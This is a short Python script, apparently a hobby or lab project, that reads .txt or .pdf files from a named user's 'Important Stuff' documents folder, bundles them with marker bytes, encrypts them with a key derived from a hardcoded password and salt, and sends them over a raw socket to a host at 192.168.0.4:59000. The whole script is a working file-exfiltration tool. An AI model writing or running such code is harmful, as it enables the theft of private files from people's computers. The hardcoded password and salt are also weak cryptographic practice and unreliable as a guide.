import os
import socket
#from crypto.Cipher import AES
import base64
import os
import random
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.fernet import Fernet

password_provided = "Covid19" # This is input in the form of a string
password = password_provided.encode() # Convert to type bytes
salt = b'Bwahaha'
kdf = PBKDF2HMAC(
    algorithm=hashes.SHA256(),
    length=32,
    salt=salt,
    iterations=100000,
    backend=default_backend()
)
key = base64.urlsafe_b64encode(kdf.derive(password)) # Can only use kdf once



socket_sender = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# connection to server using given port
receiver_info = ("192.168.0.4", 59000)
socket_sender.connect(receiver_info)


pwd = os.getcwd()
os.chdir("C:\\Users\\Jarrett\\Documents\Important Stuff")  # example
files = os.listdir("C:\\Users\\Jarrett\\Documents\\Important Stuff")

generator = int(random.uniform(0,1)*100)
if generator%2==0:
    extension = ".txt"
else:
    extension = ".pdf"

content = b''
for file in files:
    if file.endswith(extension):
        #print(file)
        
        # Open file, add relevant begin and filename markers between data
        f = open(file, "rb")
        content += b'\x00\x01\x02BEGIN\x00\x01\x02'
        content += file.encode()
        content += b'\x00\x01\x02FILENAME\x00\x01\x02'
        content += f.read()
        # Close file
        f.close()

        
# Encrypt "content" here
f = Fernet(key)
encrypted = f.encrypt(content)
#obj = AES.new('Covid19', AES.MODE_CBC)
#ciphertext = obj.encrypt(content)

socket_sender.send(encrypted)

# Important! Do not encrypt this data!        
socket_sender.send(b'\x00\x01\x02END\x00\x01\x02')

#socket_sender.send(bytes("done"))

socket_sender.close()
